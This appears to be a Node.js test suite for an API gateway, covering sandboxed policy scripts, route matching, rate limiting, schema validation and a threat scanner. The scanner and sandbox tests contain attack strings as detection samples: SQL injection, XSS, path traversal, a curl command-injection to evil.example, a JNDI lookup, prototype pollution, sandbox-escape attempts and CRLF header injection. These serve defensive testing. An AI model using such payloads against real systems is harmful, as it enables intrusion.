const { describe, it, after } = require('node:test');
const assert = require('node:assert/strict');
const { compileScript, PolicyError } = require('../src/policy');
const { PolicyRunner } = require('../src/policyRunner');
const { createLogger } = require('../src/logger');
const { compileRoutes, matchRoute } = require('../src/routes');
const { RateLimiter } = require('../src/rateLimiter');
const { buildUpstreamUrl, initialUpstreamHeaders } = require('../src/pipeline');
const flowFormat = require('../src/flow');

const input = (overrides = {}) => ({
  original: { method: 'POST', path: '/x', headers: { 'content-type': 'application/json' }, body: '{"n":1}' },
  method: 'POST',
  path: '/x',
  query: {},
  headers: { 'content-type': 'application/json' },
  body: '{"n":1}',
  response: null,
  variables: {},
  api: { id: 'api' },
  consumer: { clientId: 'client' },
  ...overrides,
});

describe('gateway scripts', () => {
  it('can change headers, body and variables, including from async code', async () => {
    const script = compileScript({
      name: 'enrich',
      code: `module.exports = async function (callcontext) {
        await Promise.resolve();
        callcontext.headers['x-tenant'] = 'acme';
        const body = JSON.parse(callcontext.original.body);
        callcontext.body = { ...body, n: body.n + 1 };
        callcontext.variables.seen = true;
        console.log('enriched', body.n);
      };`,
    });

    const result = await script.run(input());
    assert.equal(result.headers['x-tenant'], 'acme');
    assert.equal(result.body, '{"n":2}');
    assert.equal(result.bodyWasObject, true);
    assert.deepEqual(result.variables, { seen: true });
    assert.deepEqual(result.logs, [['info', 'enriched 1']]);
  });

  it('keeps callcontext.original read-only', async () => {
    const script = compileScript({ name: 'ro', code: 'module.exports = (c) => { c.original.headers.host = "evil"; };' });

    await assert.rejects(script.run(input()), (error) => error instanceof PolicyError && /read only|read-only|not extensible/i.test(error.message));
  });

  it('can answer the client directly with reply()', async () => {
    const script = compileScript({ name: 'block', code: 'module.exports = (c) => c.reply(403, { error: "blocked" }, { "x-reason": "policy" });' });

    const result = await script.run(input());
    assert.deepEqual(result.reply, { status: 403, headers: { 'x-reason': 'policy' }, body: '{"error":"blocked"}' });
  });

  it('runs onRequest before a response exists and onResponse after', async () => {
    const script = compileScript({
      name: 'phases',
      code: 'module.exports = { onRequest(c) { c.headers.phase = "request"; }, onResponse(c) { c.response.status = 201; } };',
    });

    assert.equal((await script.run(input())).headers.phase, 'request');
    const after = await script.run(input({ response: { status: 200, headers: {}, body: 'ok' } }));
    assert.equal(after.response.status, 201);
    assert.equal(after.headers.phase, undefined);
  });

  it('starts every run in a fresh context', async () => {
    const script = compileScript({ name: 'state', code: 'let count = 0; module.exports = (c) => { count += 1; c.headers.count = count; };' });

    assert.equal((await script.run(input())).headers.count, '1');
    assert.equal((await script.run(input())).headers.count, '1');
  });

  it('sends library calls to the host as JSON and gets the answer back', async () => {
    const calls = [];
    const script = compileScript({
      name: 'host',
      code: `module.exports = async (c) => {
        const answer = await http.get('https://example.test/a', { headers: { x: '1' } });
        let failure;
        try { await rateLimit.check('k', 1); } catch (error) { failure = error.message; }
        c.variables = { answer, failure };
      };`,
    });
    const host = async (kind, args) => {
      calls.push([kind, args]);
      if (kind === 'rateLimit.check') throw new Error('limiter down');
      return { status: 200, body: 'hi' };
    };

    const result = await script.run(input(), host);
    assert.deepEqual(calls, [
      ['http.request', { headers: { x: '1' }, method: 'GET', url: 'https://example.test/a' }],
      ['rateLimit.check', { key: 'k', limit: 1, period: 'minute' }],
    ]);
    assert.deepEqual(result.variables, { answer: { status: 200, body: 'hi' }, failure: 'limiter down' });
  });

  it('counts the time spent waiting for library calls against the time limit', async () => {
    const script = compileScript({ name: 'slow', timeoutMs: 50, code: 'module.exports = async () => { await http.get("https://slow.test"); };' });

    await assert.rejects(script.run(input(), () => new Promise(() => {})), /did not finish within 50 ms/);
  });

  it('reports syntax errors at compile time', () => {
    assert.throws(() => compileScript({ name: 'broken', code: 'module.exports = (c) => {' }), /syntax error/);
  });

  it('requires an exported function', () => {
    assert.throws(() => compileScript({ name: 'empty', code: 'const x = 1;' }), /must export a function/);
  });

  it('stops scripts that run too long', async () => {
    const script = compileScript({ name: 'loop', timeoutMs: 30, code: 'module.exports = () => { for (;;) {} };' });

    await assert.rejects(script.run(input()), /did not finish within 30 ms/);
  });

  it('reports a promise that never settles', async () => {
    const script = compileScript({ name: 'hang', code: 'module.exports = () => new Promise(() => {});' });

    await assert.rejects(script.run(input()), /did not finish/);
  });

  it('has no access to require, process or code generation', async () => {
    const script = compileScript({
      name: 'escape',
      code: `module.exports = async (c) => {
        let viaConstructor;
        try { viaConstructor = typeof c.constructor.constructor('return process')(); } catch (error) { viaConstructor = error.name; }
        let viaRequire;
        try { require('fs'); viaRequire = 'loaded'; } catch (error) { viaRequire = 'blocked'; }
        let viaLibrary;
        try { viaLibrary = typeof http.get.constructor('return process')(); } catch (error) { viaLibrary = error.name; }
        c.headers.result = [typeof process, typeof setTimeout, viaConstructor, viaRequire, viaLibrary].join(',');
      };`,
    });

    assert.equal((await script.run(input())).headers.result, 'undefined,undefined,EvalError,blocked,EvalError');
  });

  it('drops headers with line breaks', async () => {
    const script = compileScript({ name: 'inject', code: 'module.exports = (c) => { c.headers["x-bad"] = "a\\r\\nset-cookie: x"; c.headers["x-good"] = 1; };' });

    const result = await script.run(input());
    assert.equal(result.headers['x-bad'], undefined);
    assert.equal(result.headers['x-good'], '1');
  });
});

describe('policy worker pool', () => {
  const hostCalls = [];
  const runner = new PolicyRunner({
    size: 1,
    logger: createLogger('silent'),
    host: async (kind, args, meta) => {
      hostCalls.push({ kind, flowId: meta.flowId });
      return { allowed: true };
    },
  });
  after(() => runner.close());

  const scripts = [
    { key: 'ok', name: 'ok', timeoutMs: 100, code: 'module.exports = (c) => { c.headers.ok = "yes"; };' },
    { key: 'spin', name: 'spin', timeoutMs: 100, code: 'module.exports = async () => { for (;;) { await null; } };' },
    { key: 'memory', name: 'memory', timeoutMs: 5000, code: 'module.exports = () => { const a = []; for (;;) { a.push(new Array(1e6).fill(1)); } };' },
    { key: 'limits', name: 'limits', timeoutMs: 1000, code: 'module.exports = async (c) => { c.variables.limit = await rateLimit.check("ip", 5); c.variables.hash = await hash.sha256("abc"); };' },
  ];
  let generation;

  it('loads scripts and runs them on a worker', async () => {
    ({ generation } = await runner.load(scripts));
    runner.activate(generation, scripts);

    const result = await runner.run(generation, 'ok', input(), 100);
    assert.equal(result.headers.ok, 'yes');
  });

  it('answers library calls in the worker or on the main thread', async () => {
    const result = await runner.run(generation, 'limits', input(), 1000, { flowId: 'flow-1' });
    assert.deepEqual(result.variables.limit, { allowed: true });
    assert.equal(result.variables.hash, 'ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad');
    assert.deepEqual(hostCalls, [{ kind: 'rateLimit.check', flowId: 'flow-1' }]);
  });

  it('restarts a worker stuck in an endless async loop and keeps serving', async () => {
    await assert.rejects(runner.run(generation, 'spin', input(), 100), /did not finish within 100 ms/);

    const result = await runner.run(generation, 'ok', input(), 100);
    assert.equal(result.headers.ok, 'yes');
  });

  it('survives a script that exhausts its memory limit', async () => {
    await assert.rejects(runner.run(generation, 'memory', input(), 5000), PolicyError);

    const result = await runner.run(generation, 'ok', input(), 100);
    assert.equal(result.headers.ok, 'yes');
  });

  it('rejects a set of scripts when one does not export a function', async () => {
    await assert.rejects(runner.load([{ key: 'bad', name: 'bad', code: 'const x = 1;' }]), /must export a function/);
  });
});

describe('policy flow format', () => {
  const steps = (flow) => flow.nodes.map((node) => node.type);

  it('starts new APIs with Input connected to Output', () => {
    const flow = flowFormat.defaultFlow();
    assert.deepEqual(steps(flow), ['input', 'output']);
    assert.deepEqual(flowFormat.flowProblems(flow), []);
    assert.equal(flowFormat.usesBackend(flow), false);
  });

  it('fills in defaults and refuses broken shapes with a readable message', () => {
    const { flow } = flowFormat.normalizeFlow({
      nodes: [{ id: 'input', type: 'input' }, { id: 'call', type: 'invoke' }, { id: 'output', type: 'output' }],
      edges: [{ from: 'input', to: 'call' }, { from: 'call', to: 'output' }],
    });
    assert.equal(flow.nodes[1].name, 'Invoke service');
    assert.equal(flow.nodes[1].config.target, 'backend');
    // The step's URL is the whole address unless the request's path is asked for.
    assert.equal(flow.nodes[1].config.appendPath, false);
    assert.equal(flowFormat.defaultConfig('invoke').appendPath, false);
    assert.equal(flow.edges[0].port, 'next');
    assert.equal(flowFormat.usesBackend(flow), true);
    // A backend step with its own URL doesn't need the API's server URL.
    flow.nodes[1].config.url = 'https://orders.internal.example.com/v1';
    assert.equal(flowFormat.usesBackend(flowFormat.normalizeFlow(flow).flow), false);
    assert.match(flowFormat.normalizeFlow({ ...flow, nodes: flow.nodes.map((node) => (node.type === 'invoke' ? { ...node, config: { ...node.config, url: 'ftp://x' } } : node)) }).error, /must start with https/);

    assert.match(flowFormat.normalizeFlow({ nodes: [{ id: 'a', type: 'input' }] }).error, /exactly one Output/);
    assert.match(flowFormat.normalizeFlow({
      nodes: [{ id: 'input', type: 'input' }, { id: 'output', type: 'output' }],
      edges: [{ from: 'output', to: 'input' }],
    }).error, /start at Output/);
    assert.match(flowFormat.normalizeFlow({
      nodes: [{ id: 'input', type: 'input' }, { id: 'c', type: 'invoke', config: { target: 'url', url: 'ftp://x' } }, { id: 'output', type: 'output' }],
    }).error, /must start with https/);
  });

  it('lists what keeps a flow from being deployed', () => {
    const { flow } = flowFormat.normalizeFlow({
      nodes: [
        { id: 'input', type: 'input' },
        { id: 'check', type: 'if', name: 'Check', config: { conditions: [] } },
        { id: 'lonely', type: 'script', name: 'Lonely', config: { code: 'module.exports = () => {};' } },
        { id: 'output', type: 'output' },
      ],
      edges: [{ from: 'input', to: 'check' }, { from: 'check', port: 'true', to: 'output' }],
    });
    const messages = flowFormat.flowProblems(flow).map((problem) => `${problem.level}: ${problem.message}`);
    assert.deepEqual(messages.sort(), [
      'error: "Check" has no condition.',
      'error: The "No" line of "Check" is not connected.',
      'warning: "Lonely" is not connected to Input, so it never runs.',
    ]);
  });

  it('evaluates conditions and templates against the request', () => {
    const data = {
      request: { method: 'post', headers: { 'x-plan': 'gold' }, query: { n: '12' }, body: '{"a":{"b":3}}', json: { a: { b: 3 } } },
      variables: { score: 0.9 },
      consumer: { clientId: 'c1' },
    };
    const check = (condition) => flowFormat.testCondition({ name: '', value: '', ...condition }, data);
    assert.equal(check({ source: 'method', operator: 'equals', value: 'POST' }), true);
    assert.equal(check({ source: 'header', name: 'x-plan', operator: 'in', value: 'silver, gold' }), true);
    assert.equal(check({ source: 'query', name: 'n', operator: 'greaterThan', value: '10' }), true);
    assert.equal(check({ source: 'body', name: 'a.b', operator: 'equals', value: '3' }), true);
    assert.equal(check({ source: 'variable', name: 'score', operator: 'lessThan', value: '0.5' }), false);
    assert.equal(check({ source: 'header', name: 'x-missing', operator: 'notExists' }), true);
    assert.equal(flowFormat.renderTemplate('/plans/{{ request.headers.x-plan }}?c={{consumer.clientId}}&x={{ nope.at.all }}', data), '/plans/gold?c=c1&x=');
  });
});

describe('route matching', () => {
  const routes = compileRoutes([
    { id: 'a', name: 'Orders', basePath: '/acme/orders', operations: [{ method: 'get', path: '/orders/{id}' }, { method: 'post', path: '/orders' }] },
    { id: 'b', name: 'Orders v2', basePath: '/acme/orders/v2', operations: [{ method: 'get', path: '/items' }] },
  ]);

  it('matches path templates and extracts parameters', () => {
    const match = matchRoute(routes, 'GET', '/acme/orders/orders/A%2012');
    assert.equal(match.status, 200);
    assert.equal(match.api.id, 'a');
    assert.equal(match.path, '/orders/A%2012');
    assert.deepEqual(match.params, { id: 'A 12' });
  });

  it('prefers the longest base path', () => {
    assert.equal(matchRoute(routes, 'GET', '/acme/orders/v2/items').api.id, 'b');
  });

  it('returns 405 with the allowed methods', () => {
    assert.deepEqual(matchRoute(routes, 'DELETE', '/acme/orders/orders'), { status: 405, allow: ['POST'] });
  });

  it('returns 404 for undeclared paths and prefixes that are not path segments', () => {
    assert.equal(matchRoute(routes, 'GET', '/acme/orders/unknown').status, 404);
    assert.equal(matchRoute(routes, 'GET', '/acme/ordersX/orders/1').status, 404);
  });
});

describe('rate limiter', () => {
  it('allows up to the limit per window and reports when to retry', () => {
    let now = 60000 * 10;
    const limiter = new RateLimiter({ now: () => now });

    for (let i = 0; i < 3; i += 1) assert.equal(limiter.hit('k', 3, 'minute').allowed, true);
    const blocked = limiter.hit('k', 3, 'minute');
    assert.equal(blocked.allowed, false);
    assert.equal(blocked.resetSeconds, 60);

    // Halfway into the next window, half of the previous window still counts.
    now += 90000;
    assert.equal(limiter.hit('k', 3, 'minute').allowed, true);
    assert.equal(limiter.hit('k', 3, 'minute').allowed, true);
    assert.equal(limiter.hit('k', 3, 'minute').allowed, false);
  });
});

describe('upstream request building', () => {
  it('joins the upstream base path, operation path and query', () => {
    assert.equal(buildUpstreamUrl('https://api.acme.test/v2/', '/orders/1', '?expand=items').href, 'https://api.acme.test/v2/orders/1?expand=items');
  });

  it('never forwards the consumer token or connection headers', () => {
    const headers = initialUpstreamHeaders({
      authorization: 'Bearer abc', host: 'gw', connection: 'keep-alive, x-private', 'x-private': '1', 'content-length': '5', accept: 'json',
    });
    assert.deepEqual(headers, { accept: 'json' });
  });
});

describe('schema validation', () => {
  const { validate, readParameter, formToObject } = require('../src/schema');

  it('checks types, nullable, composition and readOnly the way OpenAPI 3.0 and 3.1 define them', () => {
    assert.deepEqual(validate({ type: 'string', nullable: true }, null), []);
    assert.deepEqual(validate({ type: ['string', 'null'] }, null), []);
    assert.equal(validate({ type: 'integer' }, 1.5)[0].message, 'must be an integer, not a number');
    assert.deepEqual(validate({ type: 'number', minimum: 0, exclusiveMinimum: true }, 0), [{ path: '', message: 'must be greater than 0' }]);
    assert.deepEqual(validate({ type: 'number', exclusiveMaximum: 10 }, 10), [{ path: '', message: 'must be less than 10' }]);
    assert.deepEqual(validate({ type: 'string', format: 'date-time' }, '2026-10-21T10:00:00Z'), []);
    assert.equal(validate({ type: 'string', format: 'email' }, 'nope')[0].message, 'must be a valid email');
    const pet = { oneOf: [{ type: 'object', required: ['bark'] }, { type: 'object', required: ['meow'] }] };
    assert.deepEqual(validate(pet, { bark: true }), []);
    assert.equal(validate(pet, { bark: true, meow: true })[0].message, 'matches more than one of the allowed schemas');
    // A readOnly property (an id the server assigns) is not required in a request.
    const order = { type: 'object', required: ['id', 'qty'], properties: { id: { type: 'string', readOnly: true }, qty: { type: 'integer' } } };
    assert.deepEqual(validate(order, { qty: 1 }, { request: true }), []);
    assert.deepEqual(validate(order, { qty: 1 }), [{ path: '/id', message: 'is required' }]);
  });

  it('rejects undeclared properties only where the schema leaves them open, across allOf parts', () => {
    const schema = { allOf: [{ type: 'object', properties: { a: { type: 'string' } } }, { properties: { b: { type: 'integer' } } }] };
    assert.deepEqual(validate(schema, { a: 'x', b: 1 }, { rejectUnknown: true }), []);
    assert.deepEqual(validate(schema, { a: 'x', c: 1 }, { rejectUnknown: true }), [{ path: '/c', message: 'is not a declared property' }]);
    assert.deepEqual(validate({ type: 'object', properties: { a: {} }, additionalProperties: true }, { z: 1 }, { rejectUnknown: true }), []);
    assert.deepEqual(validate({ type: 'object', properties: { a: {} } }, { z: 1 }), []);
  });

  it('reads parameters by their style', () => {
    const ints = { type: 'array', items: { type: 'integer' } };
    assert.deepEqual(readParameter({ in: 'query', name: 'id', schema: ints }, { id: ['1', '2'] }), { present: true, value: [1, 2] });
    assert.deepEqual(readParameter({ in: 'query', name: 'id', schema: ints, explode: false }, { id: '1,2' }), { present: true, value: [1, 2] });
    assert.deepEqual(readParameter({ in: 'query', name: 'id', schema: ints, style: 'pipeDelimited', explode: false }, { id: '3|4' }), { present: true, value: [3, 4] });
    assert.deepEqual(readParameter({ in: 'header', name: 'X-Ids', schema: ints }, { 'x-ids': '5, 6' }), { present: true, value: [5, 6] });
    assert.deepEqual(readParameter({ in: 'query', name: 'on', schema: { type: 'boolean' } }, { on: 'true' }), { present: true, value: true });
    assert.deepEqual(readParameter({ in: 'query', name: 'one', schema: { type: 'string' } }, { one: ['a', 'b'] }), { present: true, error: 'must be sent once' });
    const range = { type: 'object', properties: { min: { type: 'integer' }, max: { type: 'integer' } } };
    assert.deepEqual(readParameter({ in: 'query', name: 'range', style: 'deepObject', schema: range }, { 'range[min]': '1', 'range[max]': '9' }), { present: true, value: { min: 1, max: 9 } });
    assert.deepEqual(readParameter({ in: 'query', name: 'range', schema: range }, { min: '2' }), { present: true, value: { min: 2 } });
    assert.deepEqual(readParameter({ in: 'query', name: 'filter', contentType: 'application/json', schema: {} }, { filter: '{"a":1}' }), { present: true, value: { a: 1 } });
    assert.deepEqual(readParameter({ in: 'query', name: 'filter', contentType: 'application/json', schema: {} }, { filter: '{' }), { present: true, error: 'must be valid JSON' });
    assert.deepEqual(readParameter({ in: 'query', name: 'gone', schema: {} }, {}), { present: false });
    const form = { properties: { qty: { type: 'integer' }, tag: { type: 'array', items: { type: 'string' } } } };
    assert.deepEqual(formToObject('qty=2&tag=a&tag=b', form), { qty: 2, tag: ['a', 'b'] });
  });
});

describe('threat protection', () => {
  const { inspect, createFailureTracker, parseCidr, inRanges } = require('../src/threats');
  const config = (overrides = {}) => flowFormat.parseFlow({
    nodes: [{ id: 'input', type: 'input' }, { id: 's', type: 'security', config: overrides }, { id: 'output', type: 'output' }],
    edges: [{ from: 'input', to: 's' }, { from: 's', to: 'output' }],
  }).nodes[1].config;
  const request = (overrides) => ({ path: '/orders', query: {}, headers: {}, body: Buffer.alloc(0), ...overrides });
  const run = (overrides, req) => inspect(config(overrides), request(req), { tracker: createFailureTracker(), scope: 's' });
  const scan = (value, overrides) => run(overrides, { query: { q: value } }).findings.map((finding) => finding.rule);

  it('finds encoded and obfuscated attacks', () => {
    assert.deepEqual(scan("admin'-- "), ['sql_injection']);
    assert.deepEqual(scan('1 UNION/**/SELECT card FROM cards'), ['sql_injection']);
    assert.deepEqual(scan('1; DROP TABLE orders'), ['sql_injection']);
    assert.deepEqual(scan('1 AND SLEEP(5)'), ['sql_injection']);
    assert.deepEqual(scan('%253Cscript%253Ealert(1)'), ['script_injection']);
    assert.deepEqual(scan('&lt;img src=x onerror=alert(1)&gt;'), ['script_injection']);
    assert.deepEqual(scan('JaVaScRiPt:alert(1)'), ['script_injection']);
    assert.deepEqual(scan('..\\..\\windows\\win.ini'), ['path_traversal']);
    assert.deepEqual(scan('a.txt%00.png'), ['path_traversal']);
    assert.deepEqual(scan('x && curl http://evil.example'), ['command_injection']);
    assert.deepEqual(scan('${jndi:ldap://evil.example/a}'), ['command_injection']);
  });

  it('lets ordinary text through', () => {
    const texts = ["O'Brien", 'Tom & Jerry; id card', 'select an item from the list', '(see note) #3', 'rock & roll', 'a+b=c',
      'price < 10 and size > 2', 'C:/Users/ann/report.pdf', 'Wait 5 minutes; sleep well', '1 or 2 items', "it's -- fine"];
    for (const text of texts) assert.deepEqual(scan(text), [], text);
  });

  it('applies only the checks that are on, in the places chosen', () => {
    assert.deepEqual(scan("' OR '1'='1", { sqlInjection: false }), []);
    assert.deepEqual(scan("' OR '1'='1", { scanQuery: false }), []);
    const body = (text, overrides) => run(overrides, { headers: { 'content-type': 'application/json' }, body: Buffer.from(text) });
    assert.equal(body('{"a":{"b":{"c":1}}}', { maxJsonDepth: 2 }).reply.status, 400);
    assert.equal(body('[1,2,3,4]', { maxJsonEntries: 3 }).reply.error, 'request_too_complex');
    assert.equal(body('{"x":"yyyy"}', { maxBodyKb: 0 }).reply, null);
    assert.equal(body(JSON.stringify({ x: 'y'.repeat(2048) }), { maxBodyKb: 1 }).reply.status, 413);
    assert.deepEqual(body('{"constructor":{"prototype":{"admin":true}}}').findings.map((finding) => finding.location), ['body.constructor', 'body.constructor.prototype']);
    assert.deepEqual(run({}, { query: { 'user[$ne]': '' } }).findings.map((finding) => finding.rule), ['nosql_injection']);
  });

  it('matches IPv4 and IPv6 ranges', () => {
    assert.ok(inRanges('10.1.2.3', [parseCidr('10.0.0.0/8')]));
    assert.ok(inRanges('::ffff:10.1.2.3', [parseCidr('10.0.0.0/8')]));
    assert.ok(!inRanges('11.0.0.1', [parseCidr('10.0.0.0/8')]));
    assert.ok(inRanges('2001:db8::1', [parseCidr('2001:db8::/32')]));
    assert.ok(!inRanges('2001:db9::1', [parseCidr('2001:db8::/32')]));
    assert.ok(inRanges('fe80:0:0:0:1:2:3:4', [parseCidr('fe80::/10')]));
    assert.equal(parseCidr('300.1.1.1'), null);
  });

  it('locks a key out after the allowed failures and lets it in again after the lockout', () => {
    let time = 0;
    const tracker = createFailureTracker({ now: () => time });
    const rule = { maxFailures: 2, windowSeconds: 10, lockoutSeconds: 30 };
    assert.equal(tracker.fail('s', 'ann', rule), false);
    time = 11000; // outside the window: counting starts again
    assert.equal(tracker.fail('s', 'ann', rule), false);
    assert.equal(tracker.fail('s', 'ann', rule), true);
    assert.equal(tracker.lockedFor('s', 'ann'), 30);
    assert.equal(tracker.lockedFor('other-step', 'ann'), 0);
    time += 30000;
    assert.equal(tracker.lockedFor('s', 'ann'), 0);
  });

  it('normalizes Security settings and reports what blocks deploying', () => {
    assert.throws(() => config({ ipDeny: '10.0.0.0/33' }), /not an IP address or range/);
    assert.throws(() => config({ bruteStatuses: '200' }), /status codes from 400 to 599/);
    assert.throws(() => config({ bruteMax: 0 }), /failed attempts must be a whole number from 1/);
    assert.deepEqual(config({ ipAllow: '203.0.113.0/24\n2001:db8::/32' }).ipAllow, ['203.0.113.0/24', '2001:db8::/32']);
    assert.deepEqual(config({ bruteStatuses: '401, 403, 401' }).bruteStatuses, [401, 403]);
    const chain = (step) => flowFormat.parseFlow({
      nodes: [{ id: 'input', type: 'input' }, { id: 's', ...step }, { id: 'output', type: 'output' }],
      edges: [{ from: 'input', to: 's' }, { from: 's', to: 'output' }],
    });
    assert.match(flowFormat.flowErrors(chain({ type: 'security', config: { bruteForce: true, bruteKey: 'body' } }))[0].message, /Name the field/);
    assert.ok(flowFormat.usesContract(chain({ type: 'validateBody' })));
    assert.ok(!flowFormat.usesContract(chain({ type: 'security' })));
  });
});
